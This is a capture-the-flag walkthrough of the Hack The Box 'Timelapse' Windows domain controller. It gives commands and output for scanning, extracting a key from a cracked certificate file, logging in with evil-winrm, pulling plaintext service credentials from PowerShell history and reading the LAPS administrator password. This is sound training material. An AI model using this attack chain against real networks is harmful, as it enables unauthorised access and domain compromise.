nmap
```
┌──(kali㉿kali)-[~/HTB/timelapse-AD]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.186.101
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-22 20:58 EST
Nmap scan report for 10.129.186.101
Host is up (0.12s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-01-23 10:01:26Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_ssl-date: 2025-01-23T10:03:01+00:00; +7h59m58s from scanner time.
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49677/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-23T10:02:25
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   129.13 ms 10.10.14.1
2   130.02 ms 10.129.186.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 269.35 seconds
```

![Pasted image 20250123101545](<0. Attachments/Pasted image 20250123101545.png>)

![Pasted image 20250123101651](<0. Attachments/Pasted image 20250123101651.png>)

![Pasted image 20250123101949](<0. Attachments/Pasted image 20250123101949.png>)

![Pasted image 20250123102235](<0. Attachments/Pasted image 20250123102235.png>)

![Pasted image 20250123102425](<0. Attachments/Pasted image 20250123102425.png>)

![Pasted image 20250123102531](<0. Attachments/Pasted image 20250123102531.png>)

we need to crack the pfx file as well
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
```

![Pasted image 20250123102736](<0. Attachments/Pasted image 20250123102736.png>)

![Pasted image 20250123102925](<0. Attachments/Pasted image 20250123102925.png>)

![Pasted image 20250123121637](<0. Attachments/Pasted image 20250123121637.png>)

Extract the key then decrypt it
```
┌──(kali㉿kali)-[~/HTB/timelapse-AD]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
                                                                                                                                           
┌──(kali㉿kali)-[~/HTB/timelapse-AD]
└─$ openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key            
Enter pass phrase for legacyy_dev_auth.key-enc:
writing RSA key
```
![Pasted image 20250123121931](<0. Attachments/Pasted image 20250123121931.png>)

now dump the certificate
`openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt`
![Pasted image 20250123122221](<0. Attachments/Pasted image 20250123122221.png>)

using evil-winrm
```
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```
![Pasted image 20250123122344](<0. Attachments/Pasted image 20250123122344.png>)
![Pasted image 20250123122514](<0. Attachments/Pasted image 20250123122514.png>)

reading powershell history
```
*Evil-WinRM* PS C:\Users\legacyy\desktop> ls C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


    Directory: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2022  11:46 PM            434 ConsoleHost_history.txt


*Evil-WinRM* PS C:\Users\legacyy\desktop> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```
![Pasted image 20250123122811](<0. Attachments/Pasted image 20250123122811.png>)
we have svc_deploy creds

![Pasted image 20250123123124](<0. Attachments/Pasted image 20250123123124.png>)

![Pasted image 20250123123213](<0. Attachments/Pasted image 20250123123213.png>)
```
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

```
DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : N;7i,5)vjN0SS6qH3%%E1qQ9
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

The system needs to know the password for an administrative user on the box. For systems where LAPS is in use, that’s not possible (as it changes the password periodically). The work around here is to add another user that the system can use for administrative access with a static password. This user exists only to enable flag rotation.

![Pasted image 20250123123706](<0. Attachments/Pasted image 20250123123706.png>)
![Pasted image 20250123123727](<0. Attachments/Pasted image 20250123123727.png>)

